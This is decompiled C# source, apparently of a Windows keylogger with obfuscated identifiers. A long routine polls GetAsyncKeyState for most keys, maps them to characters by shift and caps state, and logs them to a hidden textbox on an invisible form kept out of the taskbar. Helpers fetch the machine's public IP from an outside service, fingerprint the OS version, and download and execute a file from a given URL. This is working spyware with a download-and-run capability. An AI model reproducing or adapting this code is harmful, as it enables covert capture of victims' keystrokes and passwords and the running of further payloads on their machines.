						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_018c;
						}
						goto IL_01a0;
						IL_018c:
						num = 26;
						bHfPLgsKXM = " ";
						goto IL_11f2;
						IL_01a0:
						num = 30;
						pubHfwT = GetAsyncKeyState(186);
						goto IL_01b9;
						IL_01b9:
						num = 31;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_01d5;
						}
						goto IL_020d;
						IL_01d5:
						num = 32;
						if (!dFpchsNs())
						{
							goto IL_01e1;
						}
						goto IL_01f5;
						IL_01e1:
						num = 33;
						bHfPLgsKXM = ";";
						goto IL_11f2;
						IL_01f5:
						num = 35;
						goto IL_01f9;
						IL_01f9:
						num = 36;
						bHfPLgsKXM = ":";
						goto IL_11f2;
						IL_020d:
						num = 41;
						pubHfwT = GetAsyncKeyState(187);
						goto IL_0226;
						IL_0226:
						num = 42;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0242;
						}
						goto IL_027a;
						IL_0242:
						num = 43;
						if (!dFpchsNs())
						{
							goto IL_024e;
						}
						goto IL_0262;
						IL_024e:
						num = 44;
						bHfPLgsKXM = "=";
						goto IL_11f2;
						IL_0262:
						num = 46;
						goto IL_0266;
						IL_0266:
						num = 47;
						bHfPLgsKXM = "+";
						goto IL_11f2;
						IL_027a:
						num = 52;
						pubHfwT = GetAsyncKeyState(188);
						goto IL_0293;
						IL_0293:
						num = 53;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_02af;
						}
						goto IL_02e7;
						IL_02af:
						num = 54;
						if (!dFpchsNs())
						{
							goto IL_02bb;
						}
						goto IL_02cf;
						IL_02bb:
						num = 55;
						bHfPLgsKXM = ",";
						goto IL_11f2;
						IL_02cf:
						num = 57;
						goto IL_02d3;
						IL_02d3:
						num = 58;
						bHfPLgsKXM = "<";
						goto IL_11f2;
						IL_02e7:
						num = 63;
						pubHfwT = GetAsyncKeyState(189);
						goto IL_0300;
						IL_0300:
						num = 64;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_031c;
						}
						goto IL_0354;
						IL_031c:
						num = 65;
						if (!dFpchsNs())
						{
							goto IL_0328;
						}
						goto IL_033c;
						IL_0328:
						num = 66;
						bHfPLgsKXM = "-";
						goto IL_11f2;
						IL_033c:
						num = 68;
						goto IL_0340;
						IL_0340:
						num = 69;
						bHfPLgsKXM = "_";
						goto IL_11f2;
						IL_0354:
						num = 74;
						pubHfwT = GetAsyncKeyState(190);
						goto IL_036d;
						IL_036d:
						num = 75;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0389;
						}
						goto IL_03c1;
						IL_0389:
						num = 76;
						if (!dFpchsNs())
						{
							goto IL_0395;
						}
						goto IL_03a9;
						IL_0395:
						num = 77;
						bHfPLgsKXM = ".";
						goto IL_11f2;
						IL_03a9:
						num = 79;
						goto IL_03ad;
						IL_03ad:
						num = 80;
						bHfPLgsKXM = ">";
						goto IL_11f2;
						IL_03c1:
						num = 85;
						pubHfwT = GetAsyncKeyState(191);
						goto IL_03da;
						IL_03da:
						num = 86;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_03f6;
						}
						goto IL_042e;
						IL_03f6:
						num = 87;
						if (!dFpchsNs())
						{
							goto IL_0402;
						}
						goto IL_0416;
						IL_0402:
						num = 88;
						bHfPLgsKXM = "/";
						goto IL_11f2;
						IL_0416:
						num = 90;
						goto IL_041a;
						IL_041a:
						num = 91;
						bHfPLgsKXM = "?";
						goto IL_11f2;
						IL_042e:
						num = 96;
						pubHfwT = GetAsyncKeyState(192);
						goto IL_0447;
						IL_0447:
						num = 97;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0463;
						}
						goto IL_049b;
						IL_0463:
						num = 98;
						if (!dFpchsNs())
						{
							goto IL_046f;
						}
						goto IL_0483;
						IL_046f:
						num = 99;
						bHfPLgsKXM = "`";
						goto IL_11f2;
						IL_0483:
						num = 101;
						goto IL_0487;
						IL_0487:
						num = 102;
						bHfPLgsKXM = "~";
						goto IL_11f2;
						IL_049b:
						num = 107;
						pubHfwT = GetAsyncKeyState(96);
						goto IL_04b1;
						IL_04b1:
						num = 108;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_04cd;
						}
						goto IL_0505;
						IL_04cd:
						num = 109;
						if (!dFpchsNs())
						{
							goto IL_04d9;
						}
						goto IL_04ed;
						IL_04d9:
						num = 110;
						bHfPLgsKXM = "0";
						goto IL_11f2;
						IL_04ed:
						num = 112;
						goto IL_04f1;
						IL_04f1:
						num = 113;
						bHfPLgsKXM = ")";
						goto IL_11f2;
						IL_0505:
						num = 118;
						pubHfwT = GetAsyncKeyState(97);
						goto IL_051b;
						IL_051b:
						num = 119;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0537;
						}
						goto IL_056f;
						IL_0537:
						num = 120;
						if (!dFpchsNs())
						{
							goto IL_0543;
						}
						goto IL_0557;
						IL_0543:
						num = 121;
						bHfPLgsKXM = "1";
						goto IL_11f2;
						IL_0557:
						num = 123;
						goto IL_055b;
						IL_055b:
						num = 124;
						bHfPLgsKXM = "!";
						goto IL_11f2;
						IL_056f:
						num = 129;
						pubHfwT = GetAsyncKeyState(98);
						goto IL_0588;
						IL_0588:
						num = 130;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_05a7;
						}
						goto IL_05eb;
						IL_05a7:
						num = 131;
						if (!dFpchsNs())
						{
							goto IL_05b6;
						}
						goto IL_05cd;
						IL_05b6:
						num = 132;
						bHfPLgsKXM = "2";
						goto IL_11f2;
						IL_05cd:
						num = 134;
						goto IL_05d4;
						IL_05d4:
						num = 135;
						bHfPLgsKXM = "@";
						goto IL_11f2;
						IL_05eb:
						num = 140;
						pubHfwT = GetAsyncKeyState(99);
						goto IL_0604;
						IL_0604:
						num = 141;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0623;
						}
						goto IL_0667;
						IL_0623:
						num = 142;
						if (!dFpchsNs())
						{
							goto IL_0632;
						}
						goto IL_0649;
						IL_0632:
						num = 143;
						bHfPLgsKXM = "3";
						goto IL_11f2;
						IL_0649:
						num = 145;
						goto IL_0650;
						IL_0650:
						num = 146;
						bHfPLgsKXM = "#";
						goto IL_11f2;
						IL_0667:
						num = 151;
						pubHfwT = GetAsyncKeyState(100);
						goto IL_0680;
						IL_0680:
						num = 152;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_069f;
						}
						goto IL_06e3;
						IL_069f:
						num = 153;
						if (!dFpchsNs())
						{
							goto IL_06ae;
						}
						goto IL_06c5;
						IL_06ae:
						num = 154;
						bHfPLgsKXM = "4";
						goto IL_11f2;
						IL_06c5:
						num = 156;
						goto IL_06cc;
						IL_06cc:
						num = 157;
						bHfPLgsKXM = "$";
						goto IL_11f2;
						IL_06e3:
						num = 162;
						pubHfwT = GetAsyncKeyState(101);
						goto IL_06fc;
						IL_06fc:
						num = 163;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_071b;
						}
						goto IL_075f;
						IL_071b:
						num = 164;
						if (!dFpchsNs())
						{
							goto IL_072a;
						}
						goto IL_0741;
						IL_072a:
						num = 165;
						bHfPLgsKXM = "5";
						goto IL_11f2;
						IL_0741:
						num = 167;
						goto IL_0748;
						IL_0748:
						num = 168;
						bHfPLgsKXM = "%";
						goto IL_11f2;
						IL_075f:
						num = 173;
						pubHfwT = GetAsyncKeyState(102);
						goto IL_0778;
						IL_0778:
						num = 174;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0797;
						}
						goto IL_07db;
						IL_0797:
						num = 175;
						if (!dFpchsNs())
						{
							goto IL_07a6;
						}
						goto IL_07bd;
						IL_07a6:
						num = 176;
						bHfPLgsKXM = "6";
						goto IL_11f2;
						IL_07bd:
						num = 178;
						goto IL_07c4;
						IL_07c4:
						num = 179;
						bHfPLgsKXM = "7";
						goto IL_11f2;
						IL_07db:
						num = 184;
						pubHfwT = GetAsyncKeyState(103);
						goto IL_07f4;
						IL_07f4:
						num = 185;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0813;
						}
						goto IL_0857;
						IL_0813:
						num = 186;
						if (!dFpchsNs())
						{
							goto IL_0822;
						}
						goto IL_0839;
						IL_0822:
						num = 187;
						bHfPLgsKXM = "7";
						goto IL_11f2;
						IL_0839:
						num = 189;
						goto IL_0840;
						IL_0840:
						num = 190;
						bHfPLgsKXM = "&";
						goto IL_11f2;
						IL_0857:
						num = 195;
						pubHfwT = GetAsyncKeyState(104);
						goto IL_0870;
						IL_0870:
						num = 196;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_088f;
						}
						goto IL_08d3;
						IL_088f:
						num = 197;
						if (!dFpchsNs())
						{
							goto IL_089e;
						}
						goto IL_08b5;
						IL_089e:
						num = 198;
						bHfPLgsKXM = "8";
						goto IL_11f2;
						IL_08b5:
						num = 200;
						goto IL_08bc;
						IL_08bc:
						num = 201;
						bHfPLgsKXM = "*";
						goto IL_11f2;
						IL_08d3:
						num = 206;
						pubHfwT = GetAsyncKeyState(105);
						goto IL_08ec;
						IL_08ec:
						num = 207;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_090b;
						}
						goto IL_094f;
						IL_090b:
						num = 208;
						if (!dFpchsNs())
						{
							goto IL_091a;
						}
						goto IL_0931;
						IL_091a:
						num = 209;
						bHfPLgsKXM = "9";
						goto IL_11f2;
						IL_0931:
						num = 211;
						goto IL_0938;
						IL_0938:
						num = 212;
						bHfPLgsKXM = "(";
						goto IL_11f2;
						IL_094f:
						num = 217;
						pubHfwT = GetAsyncKeyState(106);
						goto IL_0968;
						IL_0968:
						num = 218;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0987;
						}
						goto IL_09e0;
						IL_0987:
						num = 219;
						if (!dFpchsNs())
						{
							goto IL_0996;
						}
						goto IL_09c2;
						IL_0996:
						num = 220;
						bHfPLgsKXM = "*";
						goto IL_09a8;
						IL_09a8:
						num = 221;
						charCount++;
						goto IL_11f2;
						IL_09c2:
						num = 223;
						goto IL_09c9;
						IL_09c9:
						num = 224;
						bHfPLgsKXM = "";
						goto IL_11f2;
						IL_09e0:
						num = 228;
						pubHfwT = GetAsyncKeyState(107);
						goto IL_09f9;
						IL_09f9:
						num = 229;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0a18;
						}
						goto IL_0a5c;
						IL_0a18:
						num = 230;
						if (!dFpchsNs())
						{
							goto IL_0a27;
						}
						goto IL_0a3e;
						IL_0a27:
						num = 231;
						bHfPLgsKXM = "+";
						goto IL_11f2;
						IL_0a3e:
						num = 233;
						goto IL_0a45;
						IL_0a45:
						num = 234;
						bHfPLgsKXM = "=";
						goto IL_11f2;
						IL_0a5c:
						num = 239;
						pubHfwT = GetAsyncKeyState(108);
						goto IL_0a75;
						IL_0a75:
						num = 240;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0a94;
						}
						goto IL_0aab;
						IL_0a94:
						num = 241;
						bHfPLgsKXM = "";
						goto IL_11f2;
						IL_0aab:
						num = 244;
						pubHfwT = GetAsyncKeyState(109);
						goto IL_0ac4;
						IL_0ac4:
						num = 245;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0ae3;
						}
						goto IL_0b27;
						IL_0ae3:
						num = 246;
						if (!dFpchsNs())
						{
							goto IL_0af2;
						}
						goto IL_0b09;
						IL_0af2:
						num = 247;
						bHfPLgsKXM = "-";
						goto IL_11f2;
						IL_0b09:
						num = 249;
						goto IL_0b10;
						IL_0b10:
						num = 250;
						bHfPLgsKXM = "_";
						goto IL_11f2;
						IL_0b27:
						num = 255;
						pubHfwT = GetAsyncKeyState(110);
						goto IL_0b40;
						IL_0b40:
						num = 256;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0b5f;
						}
						goto IL_0ba3;
						IL_0b5f:
						num = 257;
						if (!dFpchsNs())
						{
							goto IL_0b6e;
						}
						goto IL_0b85;
						IL_0b6e:
						num = 258;
						bHfPLgsKXM = ".";
						goto IL_11f2;
						IL_0b85:
						num = 260;
						goto IL_0b8c;
						IL_0b8c:
						num = 261;
						bHfPLgsKXM = ">";
						goto IL_11f2;
						IL_0ba3:
						num = 266;
						pubHfwT = GetAsyncKeyState(111);
						goto IL_0bbc;
						IL_0bbc:
						num = 267;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0bdb;
						}
						goto IL_0bf2;
						IL_0bdb:
						num = 268;
						bHfPLgsKXM = "/";
						goto IL_11f2;
						IL_0bf2:
						num = 272;
						pubHfwT = GetAsyncKeyState(2);
						goto IL_0c0a;
						IL_0c0a:
						num = 273;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0c29;
						}
						goto IL_0c6d;
						IL_0c29:
						num = 274;
						if (!dFpchsNs())
						{
							goto IL_0c38;
						}
						goto IL_0c4f;
						IL_0c38:
						num = 275;
						bHfPLgsKXM = "/";
						goto IL_11f2;
						IL_0c4f:
						num = 277;
						goto IL_0c56;
						IL_0c56:
						num = 278;
						bHfPLgsKXM = "?";
						goto IL_11f2;
						IL_0c6d:
						num = 283;
						pubHfwT = GetAsyncKeyState(220);
						goto IL_0c89;
						IL_0c89:
						num = 284;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0ca8;
						}
						goto IL_0cec;
						IL_0ca8:
						num = 285;
						if (!dFpchsNs())
						{
							goto IL_0cb7;
						}
						goto IL_0cce;
						IL_0cb7:
						num = 286;
						bHfPLgsKXM = "\\";
						goto IL_11f2;
						IL_0cce:
						num = 288;
						goto IL_0cd5;
						IL_0cd5:
						num = 289;
						bHfPLgsKXM = "|";
						goto IL_11f2;
						IL_0cec:
						num = 294;
						pubHfwT = GetAsyncKeyState(222);
						goto IL_0d08;
						IL_0d08:
						num = 295;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0d27;
						}
						goto IL_0d6d;
						IL_0d27:
						num = 296;
						if (!dFpchsNs())
						{
							goto IL_0d36;
						}
						goto IL_0d4d;
						IL_0d36:
						num = 297;
						bHfPLgsKXM = "'";
						goto IL_11f2;
						IL_0d4d:
						num = 299;
						goto IL_0d54;
						IL_0d54:
						num = 300;
						bHfPLgsKXM = '"';
						goto IL_11f2;
						IL_0d6d:
						num = 305;
						pubHfwT = GetAsyncKeyState(221);
						goto IL_0d89;
						IL_0d89:
						num = 306;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0da8;
						}
						goto IL_0dec;
						IL_0da8:
						num = 307;
						if (!dFpchsNs())
						{
							goto IL_0db7;
						}
						goto IL_0dce;
						IL_0db7:
						num = 308;
						bHfPLgsKXM = "]";
						goto IL_11f2;
						IL_0dce:
						num = 310;
						goto IL_0dd5;
						IL_0dd5:
						num = 311;
						bHfPLgsKXM = "}";
						goto IL_11f2;
						IL_0dec:
						num = 316;
						pubHfwT = GetAsyncKeyState(219);
						goto IL_0e08;
						IL_0e08:
						num = 317;
						if (Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0e27;
						}
						goto IL_0e6b;
						IL_0e27:
						num = 318;
						if (!dFpchsNs())
						{
							goto IL_0e36;
						}
						goto IL_0e4d;
						IL_0e36:
						num = 319;
						bHfPLgsKXM = "[";
						goto IL_11f2;
						IL_0e4d:
						num = 321;
						goto IL_0e54;
						IL_0e54:
						num = 322;
						bHfPLgsKXM = "{";
						goto IL_11f2;
						IL_0e6b:
						num = 327;
						if (ForLoopControl.ForLoopInitObj(i, (object)48, (object)57, (object)1, ref obj, ref i))
						{
							goto IL_0e9e;
						}
						goto IL_1073;
						IL_0e9e:
						num = 328;
						pubHfwT = GetAsyncKeyState(Conversions.ToInteger(i));
						goto IL_0ec0;
						IL_0ec0:
						num = 329;
						if (!Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_0edf;
						}
						goto IL_0eff;
						IL_0edf:
						num = 371;
						if (ForLoopControl.ForNextCheckObj(i, obj, ref i))
						{
							goto IL_0e9e;
						}
						goto IL_1073;
						IL_0eff:
						num = 330;
						if (dFpchsNs())
						{
							goto IL_0f11;
						}
						goto IL_1045;
						IL_0f11:
						num = 331;
						switch (Conversion.Val(Strings.Chr(Conversions.ToInteger(i))))
						{
						case 0:
							break;
						case 1:
							goto IL_0f76;
						case 2:
							goto IL_0f8d;
						case 3:
							goto IL_0fa4;
						case 4:
							goto IL_0fbb;
						case 5:
							goto IL_0fd2;
						case 6:
							goto IL_0fe9;
						case 7:
							goto IL_1000;
						case 8:
							goto IL_1017;
						case 9:
							goto IL_102e;
						default:
							goto IL_11f2;
						}
						goto IL_0f5f;
						IL_102e:
						num = 359;
						bHfPLgsKXM = "(";
						goto IL_11f2;
						IL_1017:
						num = 356;
						bHfPLgsKXM = "*";
						goto IL_11f2;
						IL_1000:
						num = 353;
						bHfPLgsKXM = "&";
						goto IL_11f2;
						IL_0fe9:
						num = 350;
						bHfPLgsKXM = "^";
						goto IL_11f2;
						IL_0fd2:
						num = 347;
						bHfPLgsKXM = "%";
						goto IL_11f2;
						IL_0fbb:
						num = 344;
						bHfPLgsKXM = "$";
						goto IL_11f2;
						IL_0fa4:
						num = 341;
						bHfPLgsKXM = "#";
						goto IL_11f2;
						IL_0f8d:
						num = 338;
						bHfPLgsKXM = "@";
						goto IL_11f2;
						IL_0f76:
						num = 335;
						bHfPLgsKXM = "!";
						goto IL_11f2;
						IL_0f5f:
						num = 362;
						bHfPLgsKXM = ")";
						goto IL_11f2;
						IL_1045:
						num = 365;
						goto IL_104c;
						IL_104c:
						num = 366;
						bHfPLgsKXM = Strings.Chr(Conversions.ToInteger(i));
						goto IL_11f2;
						IL_1073:
						num = 372;
						if (!ForLoopControl.ForLoopInitObj(i, (object)65, (object)128, (object)1, ref obj2, ref i))
						{
							break;
						}
						goto IL_10a9;
						IL_10a9:
						num = 373;
						pubHfwT = GetAsyncKeyState(Conversions.ToInteger(i));
						goto IL_10cb;
						IL_10cb:
						num = 374;
						if (!Operators.ConditionalCompareObjectEqual(pubHfwT, (object)(-32767), false))
						{
							goto IL_10ea;
						}
						goto IL_110b;
						IL_10ea:
						num = 394;
						if (!ForLoopControl.ForNextCheckObj(i, obj2, ref i))
						{
							break;
						}
						goto IL_10a9;
						IL_110b:
						num = 375;
						if (!dFpchsNs())
						{
							goto IL_111a;
						}
						goto IL_1185;
						IL_111a:
						num = 376;
						if (ckDKPQddh())
						{
							goto IL_1129;
						}
						goto IL_1155;
						IL_1129:
						num = 377;
						bHfPLgsKXM = Strings.UCase(Strings.Chr(Conversions.ToInteger(i)));
						goto IL_11f2;
						IL_1155:
						num = 379;
						goto IL_115c;
						IL_115c:
						num = 380;
						bHfPLgsKXM = Strings.LCase(Strings.Chr(Conversions.ToInteger(i)));
						goto IL_11f2;
						IL_1185:
						num = 383;
						goto IL_118c;
						IL_118c:
						num = 384;
						if (!ckDKPQddh())
						{
							goto IL_119b;
						}
						goto IL_11c4;
						IL_119b:
						num = 385;
						bHfPLgsKXM = Strings.UCase(Strings.Chr(Conversions.ToInteger(i)));
						goto IL_11f2;
						IL_11c4:
						num = 387;
						goto IL_11cb;
						IL_11cb:
						num = 388;
						bHfPLgsKXM = Strings.LCase(Strings.Chr(Conversions.ToInteger(i)));
						goto IL_11f2;
						IL_11f2:
						num = 397;
						if (charCount > lineLimit)
						{
							goto IL_1207;
						}
						goto IL_122c;
						IL_1207:
						num = 398;
						charCount = 0;
						goto IL_1215;
						IL_1215:
						num = 399;
						((TextBoxBase)TextBox1).AppendText("\r\n");
						goto IL_122c;
						IL_122c:
						num = 401;
						if (Operators.ConditionalCompareObjectNotEqual(bHfPLgsKXM, (object)"", false))
						{
							goto IL_1246;
						}
						goto IL_1263;
						IL_1246:
						num = 402;
						((TextBoxBase)TextBox1).AppendText(Conversions.ToString(bHfPLgsKXM));
						goto IL_1263;
						end_IL_0000_2:
						break;
					}
					num = 395;
					Application.DoEvents();
					break;
				}
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 7103;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private IPAddress GetMyIP()
	{
		using WebClient webClient = new WebClient();
		return IPAddress.Parse(Encoding.ASCII.GetString(webClient.DownloadData("http://automation.whatismyip.com/n09230945.asp")));
	}

	public static string zldFRbivt()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string result = "UN";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 0:
				result = "95";
				break;
			case 10:
				result = "98";
				break;
			case 90:
				result = "ME";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				result = "NT";
				break;
			case 4:
				result = "NT";
				break;
			case 5:
				if (oSVersion.Version.Minor == 0)
				{
					result = "2K";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					result = "XP";
				}
				else if (oSVersion.Version.Minor == 2)
				{
					result = "2K3";
				}
				break;
			case 6:
				result = "VS";
				if (oSVersion.Version.Minor == 0)
				{
					result = "VS";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					result = "W7";
				}
				break;
			}
			break;
		}
		return result;
	}

	private bool heIAyMCfK(string DLfrom, string saveto)
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(saveto))
		{
			FileSystem.Kill(saveto);
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(DLfrom, saveto);
			Process.Start(saveto);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public int WDrchwfMk(int Min, int Max)
	{
		Random random = new Random();
		return random.Next(Min, Max);
	}

	private static string Yqah(string v_strKey)
	{
		StringBuilder stringBuilder = new StringBuilder();
		int length = v_strKey.Length;
		checked
		{
			for (int i = 1; i <= length; i++)
			{
				int num = v_strKey.Length - i + 1;
				stringBuilder.Append(Strings.Mid(v_strKey, num, 1));
			}
			stringBuilder.ToString();
			return stringBuilder.ToString();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		TextBox1 = new TextBox();
		((Control)this).SuspendLayout();
		Timer2.set_Interval(1);
		TextBox textBox = TextBox1;
		Point location = new Point(12, 12);
		((Control)textBox).set_Location(location);
		((TextBoxBase)TextBox1).set_MaxLength(327670000);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(260, 238);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		((TextBoxBase)TextBox1).set_WordWrap(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
